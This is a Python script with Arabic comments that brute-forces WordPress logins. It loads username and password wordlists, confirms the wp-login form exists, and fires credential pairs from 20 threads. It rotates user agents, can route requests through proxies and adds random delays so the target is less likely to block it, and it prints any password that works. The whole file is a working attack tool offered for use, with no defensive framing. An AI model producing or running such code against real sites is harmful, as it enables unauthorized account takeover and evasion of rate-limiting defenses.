import requests
import itertools
import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# تهيئة colorama
init(autoreset=True)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
]

PROXIES = [
    # أضف هنا قائمة من البروكسيات إذا كنت ترغب في استخدامها
    # 'http://user:password@proxyserver:port',
]

def load_file(filename):
    """تحميل محتويات ملف وتحقق من وجوده"""
    if not os.path.isfile(filename):
        print(f"{Fore.RED}Error: File {filename} not found.{Style.RESET_ALL}")
        exit()
    with open(filename, 'r') as file:
        lines = [line.strip() for line in file.readlines()]
        if not lines:
            print(f"{Fore.RED}Error: File {filename} is empty.{Style.RESET_ALL}")
            exit()
        return lines

def get_random_user_agent():
    """الحصول على User-Agent عشوائي"""
    return random.choice(USER_AGENTS)

def get_random_proxy():
    """الحصول على بروكسي عشوائي"""
    if PROXIES:
        return {'http': random.choice(PROXIES), 'https': random.choice(PROXIES)}
    return None

def is_login_page(url):
    """التحقق مما إذا كانت الصفحة هي صفحة تسجيل الدخول"""
    try:
        response = requests.get(url, headers={'User-Agent': get_random_user_agent()}, proxies=get_random_proxy(), timeout=30)
        response.raise_for_status()

        # تحليل المحتوى للتحقق من وجود نموذج تسجيل الدخول
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if form:
            input_names = [input_tag.get('name', '') for input_tag in form.find_all('input')]
            # تحقق من وجود حقول تسجيل الدخول الشائعة
            if 'log' in input_names and 'pwd' in input_names:
                return True
        return False
    except requests.RequestException as e:
        print(f"{Fore.RED}Error checking login page: {e}{Style.RESET_ALL}")
        return False

def attempt_login(url, username, password):
    """محاولة تسجيل الدخول والتحقق من النجاح"""
    try:
        headers = {
            'User-Agent': get_random_user_agent()
        }
        proxies = get_random_proxy()
        response = requests.post(url, data={
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': url,
            'testcookie': '1'
        }, headers=headers, proxies=proxies, timeout=30)

        # تحقق من نجاح تسجيل الدخول بناءً على تغييرات في الاستجابة
        if 'wp-admin' in response.url or 'Dashboard' in response.text or 'logged in' in response.text:
            return (username, password, True)

        # تحقق من الرسائل التي قد تظهر عند فشل تسجيل الدخول
        if 'Invalid username' in response.text or 'Incorrect password' in response.text:
            return (username, password, False)

        return (username, password, False)
    except requests.RequestException as e:
        print(f"{Fore.RED}Request failed: {e}{Style.RESET_ALL}")
        return (username, password, False)

def brute_force_login(url, usernames, passwords):
    """تنفيذ هجوم التخمين على بيانات تسجيل الدخول"""
    if not is_login_page(url):
        print(f"{Fore.RED}The provided URL does not appear to be a login page.{Style.RESET_ALL}")
        return

    total_attempts = len(usernames) * len(passwords)
    attempts_done = 0

    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_login = {executor.submit(attempt_login, url, username, password): (username, password)
                           for username, password in itertools.product(usernames, passwords)}

        for future in as_completed(future_to_login):
            username, password = future_to_login[future]
            attempts_done += 1
            progress_percentage = (attempts_done / total_attempts) * 100

            try:
                u, p, success = future.result()
                if success:
                    print(f"{Fore.GREEN}Success! Username: {u}, Password: {p}{Style.RESET_ALL}")
                    return
                else:
                    print(f"{Fore.YELLOW}Failed Attempt: Username: {u}, Password: {p}{Style.RESET_ALL}")

            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

            # عرض نسبة التقدم
            sys.stdout.write(f"\rProgress: {progress_percentage:.2f}%")
            sys.stdout.flush()

            # تأخير بين المحاولات لتقليل احتمال الحظر
            time.sleep(random.uniform(1, 3))

    print("\nBrute force attack completed.")

def main():
    """نقطة الدخول الرئيسية للبرنامج"""
    url = input("Enter the WordPress login URL (e.g., http://example.com/wp-login.php): ").strip()

    # طلب إدخال مسارات الملفات
    username_file = input("Enter the path to the usernames file: ").strip()
    password_file = input("Enter the path to the passwords file: ").strip()

    # التحقق من وجود الملفات
    print(f"{Fore.CYAN}Loading usernames from {username_file}{Style.RESET_ALL}")
    usernames = load_file(username_file)
    print(f"{Fore.CYAN}Loading passwords from {password_file}{Style.RESET_ALL}")
    passwords = load_file(password_file)

    print(f"{Fore.GREEN}Starting brute force attack...{Style.RESET_ALL}")
    brute_force_login(url, usernames, passwords)

if __name__ == "__main__":
    main()
